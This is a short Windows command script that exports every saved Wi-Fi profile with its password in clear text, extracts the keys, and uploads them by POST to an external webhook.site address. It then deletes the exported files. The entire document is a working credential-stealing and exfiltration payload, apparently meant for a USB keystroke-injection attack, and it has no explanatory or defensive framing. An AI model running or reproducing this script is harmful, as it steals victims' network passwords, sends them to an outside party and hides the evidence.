cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q